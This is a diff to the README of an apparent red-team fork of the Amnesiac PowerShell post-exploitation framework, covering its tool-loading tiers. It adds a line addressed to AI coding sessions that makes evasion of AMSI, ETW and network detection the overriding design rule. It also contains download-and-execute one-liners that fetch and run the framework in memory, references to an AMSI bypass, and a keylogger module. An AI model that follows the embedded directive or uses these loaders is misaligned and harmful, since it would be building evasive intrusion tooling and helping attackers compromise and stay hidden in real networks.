@@ -1,5 +1,9 @@
 # Amnesiac — Red Team Edition
 
+> **For AI development sessions:** Read `docs/ARCHITECTURE.md` for the full architecture reference before making any changes. The single most important rule: **detection evasion is the primary engineering constraint** — every feature must be evaluated for disk artifacts, AMSI/ETW signatures, and anomalous target-side network traffic before implementation.
+
+---
+
 ## Project Objective
 
 Extend the [Amnesiac](https://github.com/Leo4j/Amnesiac) post-exploitation framework into a red-team-grade tool that:
@@ -53,8 +57,8 @@ AMSI scans scripts at download time, so a one-liner AMSI bypass must run first i
 # Step 2a: load from operator HTTP server (preferred — no outbound GitHub from target network)
 iex (New-Object Net.WebClient).DownloadString('http://<operator-IP>:8080/Amnesiac_ShellReady.ps1'); Amnesiac
 
-# Step 2b: load from GitHub if operator server not available
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1'); Amnesiac
+# Step 2b: load from operator's fork on GitHub if operator server not available
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1'); Amnesiac
 ```
 
 Once loaded into memory, all existing stealth features handle the rest — bypasses active in every generated payload, all tool delivery over the named pipe, no disk writes.
@@ -164,18 +168,12 @@ Tools reach targets via the named pipe channel exclusively — no network calls 
 |----------|--------|-----|
 | 1 | Embedded gzip+base64 in Amnesiac.ps1 | Always available: SimpleAMSI, NETAMSI, Token-Impersonation, Invoke-SMBRemoting, Invoke-WMIRemoting, Find-LocalAdminAccess |
 | 2 | `Tools\` directory | Loaded at startup; `modules reload` refreshes |
-| 3 | Operator local HTTP server | Run `serve` to start; loads heavy modules (Suntour, Ferrari, ppl, RDPKeylog.exe) |
-| 4 | GitHub (fallback) | `https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Tools` — used only if tool not found in tiers 1–3 |
+| 3 | GitHub on-demand (`Fetch-ToolFromGitHub`) | Fetches from `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/<name>.ps1`; per-tool URL overrides in `$global:ToolSources` (e.g. PsMapExec from its own repo). Operator-side only — target never fetches from network. |
 
 **The intended fallback chain:** Operator HTTP server first → GitHub only if server not running.
 
-**⚠️ KNOWN GAP — Fallback chain not fully wired:**
-Currently `Initialize-ToolCache` only loads tiers 1 and 2. The `serve` command downloads tools from GitHub to disk (requires `diskmode on`) then starts the HTTP server — but tools from the HTTP server are NOT automatically loaded into `$global:ToolCache`. `Send-Module` fails if the tool is not in cache; it does not auto-fetch from the HTTP server or GitHub.
-
-The intended behavior (not yet implemented):
-- `serve` should load `Tools\` into memory and start the HTTP server from that, no GitHub download
-- If a tool is missing from cache, check operator HTTP server, then GitHub (operator-side fetch only)
-- Target never makes any network call for tools
+**Tier 3 — GitHub on-demand fetch (`Fetch-ToolFromGitHub`):**
+Implemented as a helper called by `Send-Module`, `Start-LocalShell` keyword dispatch, and `load <name>`. When a tool is not found in tiers 1–2, it fetches `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/<ToolName>.ps1` operator-side, caches it in `$global:ToolCache`, and proceeds normally. This is the correct fallback for Scenario 2 (operator has only the compromised machine, no local server). Target never makes any network call.
 
 ### Target-Side Delivery (in-session)
 
@@ -233,7 +231,7 @@ Amnesiac-main/
 
 | Gap | Impact | Description |
 |-----|--------|-------------|
-| **Tool cache fallback chain** | Medium | `Send-Module` fails if tool not in cache — no auto-fetch from operator HTTP server or GitHub. Tiers 3 and 4 in the load chain are documented but not wired in code. |
+| **Tool cache fallback chain** | RESOLVED | `Fetch-ToolFromGitHub` wired into `Send-Module`, local shell keyword dispatch, and `load <name>`. On cache miss, fetches from GitHub operator-side and caches. |
 | **`serve` diskmode conflict** | RESOLVED (Plan 5) | `serve` now roots `SimpleFileServer` at `$global:AmnesiacRoot` (project root), serving `Tools\` and `Amnesiac_ShellReady.ps1` directly — no GitHub download, no disk write. |
 
 ---
